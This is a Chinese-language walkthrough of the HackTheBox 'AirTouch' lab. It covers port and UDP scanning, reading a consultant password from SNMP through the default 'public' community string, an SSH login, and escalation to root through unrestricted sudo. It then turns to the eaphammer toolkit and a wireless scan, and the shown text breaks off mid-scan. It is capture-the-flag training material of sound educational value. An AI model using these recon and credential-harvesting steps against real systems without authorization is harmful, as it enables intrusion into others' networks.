---
title: HackTheBox AirTouch：一场从 SNMP 泄露打进 WPA2 无线内网的攻击链
date: 2026-06-12
category: 网络安全
tags: HTB, WiFi
---

# HackTheBox AirTouch：一场从 SNMP 泄露打进 WPA2 无线内网的攻击链

![[file-20260505204157234.png]]

## 一、信息搜集

![[file-20260506161945648.png]]

TCP 全端口扫描 + 指纹识别：

```bash
zyf@kali:~ % sudo rustscan -a 10.129.244.98 -r 1-65535 -- -sV -O -Pn -n 
[sudo] zyf 的密码：
对不起，请重试。
[sudo] zyf 的密码：
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.
Open 10.129.244.98:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV -O -Pn -n" on ip 10.129.244.98
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 16:16 +0800
NSE: Loaded 48 scripts for scanning.
Initiating SYN Stealth Scan at 16:16
Scanning 10.129.244.98 [1 port]
Discovered open port 22/tcp on 10.129.244.98
Completed SYN Stealth Scan at 16:16, 0.13s elapsed (1 total ports)
Initiating Service scan at 16:16
Scanning 1 service on 10.129.244.98
Completed Service scan at 16:16, 0.28s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.129.244.98
NSE: Script scanning 10.129.244.98.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 16:16
Completed NSE at 16:16, 0.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 16:16
Completed NSE at 16:16, 0.01s elapsed
Nmap scan report for 10.129.244.98
Host is up, received user-set (0.080s latency).
Scanned at 2026-05-06 16:16:52 CST for 3s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=5/6%OT=22%CT=%CU=31101%PV=Y%DS=2%DC=I%G=N%TM=69FAF8F7%
OS:P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)OPS(O1=M54
OS:2ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11NW7%O6
OS:=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF
OS:=Y%T=3F%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
OS:D=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 23.387 days (since Mon Apr 13 06:59:35 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.91 seconds
           Raw packets sent: 35 (2.920KB) | Rcvd: 28 (2.304KB)
```

只扫描出了一个 TCP 端口（22），目标是一台 Linux 靶机，但是这里的 ttl 值只有 62（Linux 的默认 ttl 为 64），预期应该出现 63（因为通过 openvpn 连接的靶场，中间会多一跳 VPN 网关，默认 ttl 减去 1 之后得到的就是 63），于是判断出我们与靶机中间还隔了一台额外的设备（后续会提到）。

22 通常不是入口，但是也可以检查一下，用一下 Nmap 的脚本：

```bash
zyf@kali:/usr/share/nmap/scripts % sudo nmap -p 22 --script ssh-auth-methods,banner,sshv1 10.129.244.98 -Pn -n 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 16:37 +0800
Nmap scan report for 10.129.244.98
Host is up (0.087s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
|_banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11

Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

- 支持密钥登入和密码登入两种方式
- SSH 服务并不支持 SSHv1（有协议设计缺陷）
- 版本：OpenSSH 8.2p1

密钥爆破、打版本漏洞并不是最高的优先级，但是可以试试无密钥登入（基本没戏，用户也不知道有哪些）：

```bash
zyf@kali:/usr/share/nmap/scripts % ssh -o PasswordAuthentication=yes -o PreferredAuthentications=password root@10.129.244.98
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@10.129.244.98's password: 
Permission denied, please try again.
```

不行。

UDP 高价值服务扫描：

```
zyf@kali:/usr/share/nmap/scripts % udpx -t 10.129.244.98

        __  ______  ____ _  __
       / / / / __ \/ __ \ |/ /
      / / / / / / / /_/ /   / 
     / /_/ / /_/ / ____/   |  
     \____/_____/_/   /_/|_|  
         v1.0.7, by @nullt3r

2026/05/06 16:46:18 [+] Starting UDP scan on 1 target(s)
2026/05/06 16:46:29 [*] 10.129.244.98:161 (snmp)
2026/05/06 16:46:43 [+] Scan completed
```

发现开放了 161（UDP），运行的服务是 snmp。

用 namp 的默认脚本跑一下：

```bash
zyf@kali:~ % sudo nmap -sU -p 161 -sC 10.129.244.98 -Pn -n -sV
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 17:00 +0800
Nmap scan report for 10.129.244.98
Host is up (0.075s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5e1ac60b3ff8fa6900000000
|   snmpEngineBoots: 1
|_  snmpEngineTime: 47m07s
| snmp-sysdescr: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
|_  System uptime: 47m6.77s (282677 timeticks)
Service Info: Host: Consultant

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
```

snmp-sysdescr 脚本的结果输出了一段文字：

```
The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)
```

- 默认账号：consultant
- 密码：RxBlZhLmOkacNWScmZ6D

这里为什么能出信息呢？

首先得了解一下 SNMP 这个服务。

SNMP，全称**简单网络管理协议（Simple Network Management Protocol）**，是一种用于集中监控、管理和配置网络设备（路由器、交换机、服务器、打印机、摄像头等）的应用层协议。它的核心理念是让一个管理站（Manager）能够远程查询或修改被管设备（Agent）上的各种数据项，这些数据项都以树形结构的 OID（对象标识符）进行定义，结构如下：

```
iso (1)
 └── org (3)
      └── dod (6)
           └── internet (1)
                └── mgmt (2)
                     └── mib-2 (1)
                          ├── system (1)          
                          │    ├── sysDescr (1)   
                          │    ├── sysObjectID (2)
                          │    ├── sysUpTime (3)
                          │    └── ...
                          ├── interfaces (2)
                          ├── ip (4)
                          └── ...
```

这些 OID 都会存放于管理信息库（MIB）中。

SNMP 有三个主要版本：

- SNMPv1
- SNMPv2c
- SNMPv3

其中，SNMPv1、SNMPv2c 使用 Community String 作为唯一的身份验证凭证。

> 简单来说，你得提供 Community String 才能使用 SNMP 服务。

**关键来了**，几乎所有 SNMP 设备出厂时都有一个"只读" Community String 默认为 `public`。很多管理员部署后从不修改，导致任何人只要知道这个默认团体名，就能读取设备的大量配置和状态信息。

我们可以用这个默认 Community String 尝试访问 SNMP 服务：

```bash
zyf@kali:~ % snmpwalk -v 1 -c public 10.129.244.98
iso.3.6.1.2.1.1.1.0 = STRING: "\"The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)\""
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (482011) 1:20:20.11
iso.3.6.1.2.1.1.4.0 = STRING: "admin@AirTouch.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "Consultant"
iso.3.6.1.2.1.1.6.0 = STRING: "\"Consultant pc\""
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (488922) 1:21:29.22
```

同样可以得到默认账密信息，而且得到了更丰富的其他信息。

`snmp-sysdescr` 脚本正是基于"Community String 默认"这个的假设工作的：它尝试使用 `public`、`private` 等常见默认 Community String 去查询脚本中指定的 OID：

```nse
zyf@kali:~ % cat /usr/share/nmap/scripts/snmp-sysdescr.nse | grep "get value"
  -- get value: 1.3.6.1.2.1.1.1.0 (SNMPv2-MIB::sysDescr.0)
  -- get value: 1.3.6.1.2.1.1.3.0 (SNMPv2-MIB::sysUpTime.0)
```

## 二、consultant shell

登入 consultant 账号：

```
zyf@kali:~ % ssh consultant@10.129.244.98                        
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
consultant@10.129.244.98's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash: warning: setlocale: LC_ALL: cannot change locale (zh_CN.UTF-8)
consultant@AirTouch-Consultant:~$
```

### 1、信息搜集

先看基础的系统信息：

```
consultant@AirTouch-Consultant:~$ cat /proc/version
Linux version 5.4.0-216-generic (buildd@lcy02-amd64-014) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025
consultant@AirTouch-Consultant:~$ cat /etc/issue
Ubuntu 20.04.6 LTS \n \l
consultant@AirTouch-Consultant:~$ hostname
AirTouch-Consultant
consultant@AirTouch-Consultant:~$ uname -m
x86_64
consultant@AirTouch-Consultant:~$ id
uid=1000(consultant) gid=1000(consultant) groups=1000(consultant)
consultant@AirTouch-Consultant:~$ cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::	ip6-localnet
ff00::	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
127.0.0.1	AirTouch-Consultant
172.20.1.2	AirTouch-Consultant
```

- 内核版本：5.4.0-216-generic
- 编译器版本：gcc version 9.4.0
- OS：Ubuntu 20.04
- 主机名：AirTouch-Consultant
- 架构：x86_64
- 用户 uid 为 1000，说明是普通用户
- 本机的一个内网 IP：172.20.1.2

查看网卡信息：

```bash
consultant@AirTouch-Consultant:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if29: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether da:6c:2d:bd:02:f1 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.1.2/24 brd 172.20.1.255 scope global eth0
       valid_lft forever preferred_lft forever
7: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
8: wlan1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
9: wlan2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
10: wlan3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
11: wlan4: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
12: wlan5: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff
13: wlan6: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
```

`eth0@if29` 中的 `@if29` 是 veth pair（虚拟以太网对）的典型特征，说明目标处于容器当中，而且可以确认为 Docker 容器：

```bash
consultant@AirTouch-Consultant:~$ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 May  6 08:13 /.dockerenv
```

从输出信息中还能发现本机存在 7 个无线网卡，但是都处于未使用的状态（DOWN），而且这几个网卡都是虚拟的，理由就是其 MAC 地址过于整齐，而且不常规，很可能是用软件模拟出来的。

看看家目录里有什么：

```bash
consultant@AirTouch-Consultant:~$ ls
diagram-net.png  photo_2023-03-01_22-04-52.png
```

### 2、网络拓扑

可以发现两张图片，下载到本地：

```bash
zyf@kali:~/htb % scp consultant@10.129.244.98:~/diagram-net.png ./ 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
consultant@10.129.244.98's password: 
diagram-net.png                                                                                                                                            100%  129KB 191.0KB/s   00:00    
zyf@kali:~/htb % scp consultant@10.129.244.98:~/photo_2023-03-01_22-04-52.png ./
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
consultant@10.129.244.98's password: 
photo_2023-03-01_22-04-52.png                                                                                                                              100%  726KB 583.5KB/s   00:01    
zyf@kali:~/htb % ls
diagram-net.png  photo_2023-03-01_22-04-52.png
```

是两张网络拓扑图：

![[diagram-net.png]]

![[photo_2023-03-01_22-04-52.png]]

本质上描述的是同一个东西，本地重新画了一张：

![[file-20260506183506468.png]]

我们目前处在 Consultant Vlan 中，这里可以得到一个很关键的判断，先列举出相关的证据：

- 有 7 个无线网口，但都是软件模拟的
- 拓扑图中直接用了容器的 IP
- 目标处于容器当中

结论：本题很可能无需 Docker 逃逸，题目在宿主机上模拟了一个 WiFi 靶场环境，我们直接在容器内部打横向即可。

顺带解释一下之前 nmap 为什么看到的 ttl 值是 62。

首先，不要被上述拓扑图误导（这都是在一台机子上模拟出来的），因此设备之间的关系应该是：

![[file-20260506204823811.png]]

中间刚好两台设备（VPN 网关和宿主机），因此 TTL 为 62 是正常的。

### 3、root shell

其实早在信息搜集阶段就尝试了：

```bash
consultant@AirTouch-Consultant:~$ sudo -l
Matching Defaults entries for consultant on AirTouch-Consultant:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User consultant may run the following commands on AirTouch-Consultant:
    (ALL) NOPASSWD: ALL
```

说明 consultant 使用 `sudo` 的时候可以：

- 可以使用任意用户身份运行命令（对应第一个括号内的 ALL）
- 无需输入密码（NOPASSWD）
- 可以运行所有所有命令（对应第二个 ALL）

那直接登入 root 账户即可：

```
consultant@AirTouch-Consultant:~$ sudo -i
root@AirTouch-Consultant:~# 
```

在家目录中没有看到 `user.txt`：

```bash
root@AirTouch-Consultant:~# ls -al /root
total 28
drwx------  1 root root 4096 Jan 13 14:55 .
drwxr-xr-x  1 root root 4096 May  6 08:13 ..
lrwxrwxrwx  1 root root    9 Mar 27  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Mar 27  2024 .cache
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root  259 Mar 27  2024 .wget-hsts
drwxr-xr-x 21 root root 4096 Mar 27  2024 eaphammer
```

说明用户 flag 和管理员 flag 很可能就在之前拓扑中看到的另外两台靶机上。

还发现一个目录 `eaphammer`，里面的文件：

```bash
root@AirTouch-Consultant:~/eaphammer# ls -al
total 284
drwxr-xr-x 21 root root  4096 Mar 27  2024 .
drwx------  1 root root  4096 Jan 13 14:55 ..
drwxr-xr-x  8 root root  4096 Mar 27  2024 .git
drwxr-xr-x  3 root root  4096 Mar 27  2024 .github
-rw-r--r--  1 root root  1045 Mar 27  2024 .gitignore
-rw-r--r--  1 root root  9019 Mar 27  2024 Changelog
-rw-r--r--  1 root root  1782 Mar 27  2024 ESSIDStripping.md
-rw-r--r--  1 root root 35141 Mar 27  2024 LICENSE
-rw-r--r--  1 root root  8207 Mar 27  2024 README.md
-rw-r--r--  1 root root   114 Mar 27  2024 SECURITY.md
-rw-r--r--  1 root root   205 Mar 27  2024 __version__.py
drwxr-xr-x  2 root root  4096 Mar 27  2024 base
drwxr-xr-x  3 root root  4096 Mar 27  2024 cert_wizard
drwxr-xr-x  5 root root  4096 Mar 27  2024 certs
drwxr-xr-x  5 root root  4096 Mar 27  2024 core
drwxr-xr-x  2 root root  4096 Mar 27  2024 db
drwxr-xr-x  3 root root  4096 Mar 27  2024 docs
-rwxr-xr-x  1 root root 37449 Mar 27  2024 eaphammer
-rwxr-xr-x  1 root root 21131 Mar 27  2024 ehdb
-rwxr-xr-x  1 root root  6388 Mar 27  2024 forge-beacons
-rw-r--r--  1 root root   129 Mar 27  2024 kali-dependencies.txt
-rwxr-xr-x  1 root root  4532 Mar 27  2024 kali-setup
drwxr-xr-x  7 root root  4096 Jan 13 14:55 local
drwxr-xr-x  2 root root  4096 Mar 27  2024 logs
drwxr-xr-x  2 root root  4096 Mar 27  2024 loot
-rw-r--r--  1 root root   129 Mar 27  2024 parrot-dependencies.txt
-rwxr-xr-x  1 root root  4536 Mar 27  2024 parrot-setup
-rwxr-xr-x  1 root root  1163 Mar 27  2024 payload_generator
drwxr-xr-x  2 root root  4096 Mar 27  2024 payloads
-rw-r--r--  1 root root   132 Mar 27  2024 pip.req
-rw-r--r--  1 root root   129 Mar 27  2024 raspbian-dependencies.txt
-rwxr-xr-x  1 root root  4962 Mar 27  2024 raspbian-setup
drwxr-xr-x  2 root root  4096 Mar 27  2024 run
drwxr-xr-x  2 root root  4096 Mar 27  2024 saved-configs
drwxr-xr-x  2 root root  4096 Mar 27  2024 scripts
drwxr-xr-x  4 root root  4096 Mar 27  2024 settings
lrwxrwxrwx  1 root root    56 Mar 27  2024 templates -> /root/eaphammer/core/wskeyloggerd/templates/user_defined
drwxr-xr-x  2 root root  4096 Mar 27  2024 testing
drwxr-xr-x  2 root root  4096 Mar 27  2024 tmp
-rwxr-xr-x  1 root root  4340 Mar 27  2024 ubuntu-unattended-setup
drwxr-xr-x  2 root root  4096 Mar 27  2024 wordlists
```

从 `.git` 可以看出，这似乎是 clone 了某个仓库，搜索看看：

```
https://github.com/s0lst1c3/eaphammer
```

仓库概述：“EAPHammer 是一款用于针对 WPA2-Enterprise 网络执行定向“恶魔双胞胎”攻击的工具包。它专为全面无线评估和红队演练而设计。因此，该工具重点在于提供一个易于使用的界面，用户只需进行极少的手动配置，即可执行强大的无线攻击。”

再次坐实本题就是打无线攻击。

## 三、连接到 AirTouch-Internet

### 1、扫描无线网络

通过无线网卡枚举可见 AP。

先把一个网卡激活，我这选择的是 wlan0：

```bash
root@AirTouch-Consultant:~/eaphammer# ip link set wlan0 up
root@AirTouch-Consultant:~/eaphammer# ip addr show wlan0
7: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
```

扫描附近的 WiFi：

```bash
root@AirTouch-Consultant:~/eaphammer# iwlist wlan0 scan
wlan0     Scan completed :
          Cell 01 - Address: CE:B4:5D:7E:F4:F9
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"vodafoneFB6N"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00065125dbbb378d
                    Extra: Last beacon: 92ms ago
                    IE: Unknown: 000C766F6461666F6E654642364E
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (1) : TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 02 - Address: C6:29:4F:5B:3D:47
                    Channel:3
                    Frequency:2.422 GHz (Channel 3)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"MOVISTAR_FG68"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00065125dbbd2abb
                    Extra: Last beacon: 92ms ago
                    IE: Unknown: 000D4D4F5649535441525F46473638
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030103
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 03 - Address: 1E:2D:24:1C:10:C1
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"WIFI-JOHN"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00065125dbc01849
                    Extra: Last beacon: 92ms ago
                    IE: Unknown: 0009574946492D4A4F484E
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030106
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 04 - Address: F0:9F:C2:A3:F1:A7
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"AirTouch-Internet"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00065125dbc01871
                    Extra: Last beacon: 92ms ago
                    IE: Unknown: 0011416972546F7563682D496E7465726E6574
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030106
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : TKIP
                        Pairwise Ciphers (2) : CCMP TKIP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 05 - Address: EA:67:C7:27:13:7C
                    Channel:9
                    Frequency:2.452 GHz (Channel 9)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"MiFibra-24-D4VY"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00065125dbc3073a
                    Extra: Last beacon: 92ms ago
                    IE: Unknown: 000F4D6946696272612D32342D44345659
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030109
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
          Cell 06 - Address: AC:8B:A9:F3:A1:13
                    Channel:44
                    Frequency:5.22 GHz (Channel 44)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"AirTouch-Office"
                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 18 Mb/s; 24 Mb/s
                              36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00065125dbc9eb8c
                    Extra: Last beacon: 92ms ago
                    IE: Unknown: 000F416972546F7563682D4F6666696365
                    IE: Unknown: 01088C129824B048606C
                    IE: Unknown: 03012C
                    IE: Unknown: 070A45532024041795060D00
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : 802.1x
                    IE: Unknown: 3B027300
